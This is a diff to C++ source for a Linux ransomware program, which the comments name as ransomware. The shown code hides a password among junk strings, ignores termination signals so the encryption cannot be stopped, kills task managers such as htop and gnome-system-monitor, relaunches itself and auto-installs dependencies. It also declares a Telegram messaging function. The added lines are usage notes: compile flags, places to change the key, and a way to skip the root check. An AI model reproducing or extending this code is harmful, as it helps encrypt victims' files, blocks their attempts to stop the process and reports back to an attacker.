@@ -12,8 +12,13 @@
 // This software can alter or modify the system's operation
 // which is, to block signals from preventing this from running
 //
+// Known to work with Debian or Ubuntu based distribution.
+// Not tested on Fedora and Arch, or non-systemd distributions
+//
 // To compile this, use g++ with -lcrypto, -lcurl, -std=c++17
 // and -pthread flags
+// You may use other compiler but make sure that your compiler
+// has one of these options.
 
 
 #include <iostream>
@@ -51,10 +56,10 @@ const int SALT_SIZE = 16;
 const char FILE_SIGNATURE[] = "SILVASYSTEMS\x01\x00"; //You may change this with your own key
 const string MAP_FILE = "file_map.txt";
 
-// Obfuscated password hidden inside garbage text
+// Obfuscated password hidden inside garbage text. Change or add the strings here.
 const string junk1 = "やπ郧bnLJ9SA9uiUSjhkDxEcʥ9&aԠNISEKOIࠇ+eعKק";
 const string junk2 = "ECieNvDsPuK99suPReMO69jEa=2SDFwsEpcM8e3";
-const string junk3 = "vincemcmahon"; // you may change this password
+const string junk3 = "vincemcmahon";
 const string junk4 = "ㅴwVܮ3辸E6c&䶵Մ$sUcKmaHdIcK3ふわÅ=Đ?őŔԪ";
 const string junk5 = "𐅰E𐊘4ed𐎵𐐡flUncKj7eSOvIEtUnIoN8𐌱cR?e齉Do";
 const string junk6 = "EsU5E?cLmhH9dAzZLyuDFdaADteL94nJNka9DFaOpP";
@@ -230,7 +235,7 @@ void decryptAllFiles() {
     fs::remove(MAP_FILE);
 }
 
-//Function to ignore termination signals
+//Function to ignore termination signals (old)
     void ignoreSignals(int signal) {
     cout << "\nInterrupt blocked. Process cannot be stopped!\n" << endl;
 }
@@ -243,6 +248,9 @@ void startEncryption() {
 void signalHandler(int signum) {
     cout << "\n\033[1;31m[BLOCKED]\033[0m Attempted to terminate process! Ignored.\n" << endl;
 }
+
+// Of course to avoid killing or terminating encryption process
+// we need to block them.
 
 void setupProtection() {
     signal(SIGHUP, signalHandler);     // Terminal hangup
@@ -273,10 +281,10 @@ void setupProtection() {
 
 void monitorAndKillTaskManagers() {
     const vector<string> taskManagers = {
-    //typical task manager
+    // You may add a task manager here
         "htop", "btop", "top", "atop", "gtop",
         "vtop", "bashtop", "glances", "ksysguard", "gnome-system-monitor",
-        "xfce4-taskmanager", "lxtask", "taskmgr", "resmon", // cross-platform naming
+        "xfce4-taskmanager", "lxtask", "taskmgr", "resmon",
         "kSysGuard", "mate-system-monitor", "nmon", "bpytop", "conky",
         "perf", "iotop", "ps_mem", "nmon"
   
@@ -320,8 +328,6 @@ void watchdog(const string& selfPath) {
     exit(0);
 }
 
-
-
 void relaunchInTerminalIfDetached(const char* selfPath) {
     if (!isatty(STDIN_FILENO)) {
         const char* terminals[] = {
@@ -333,7 +339,7 @@ void relaunchInTerminalIfDetached(const char* selfPath) {
         for (int i = 0; terminals[i]; ++i) {
             string cmd = string(terminals[i]) + " -e \"" + selfPath + "\" &";
             if (system(cmd.c_str()) == 0) {
-                exit(0); // Relaunch succeeded
+                exit(0);
             }
         }
 
@@ -342,7 +348,9 @@ void relaunchInTerminalIfDetached(const char* selfPath) {
     }
 }
 
-// This part will auto install missing required dependencies if missing
+// This part will auto install required dependencies if missing.
+// Of course this ransomware will not work if one of them are not
+// installed by default
 
 string detectPackageManager() {
     if (system("command -v apt > /dev/null 2>&1") == 0) return "apt";
@@ -409,11 +417,13 @@ void sendMessageToTelegram(const string &message);
 
 int main(int argc, char* argv[]) {
 
-// This requires you to run this program into root
-if (geteuid() != 0) {
+// This requires you to run this program into root.
+// Comment the "if" part if you don't want to run it as root.
+
+/*if (geteuid() != 0) {
     cerr << "\n\033[1;31m[ERROR]\033[0m This program must be run as root." << endl;
     exit(1);
-}
+}*/
 
  cout << "\033[1;34m[START]\033[0m We need to check if the required dependencies are installed.\n" << endl;
                   
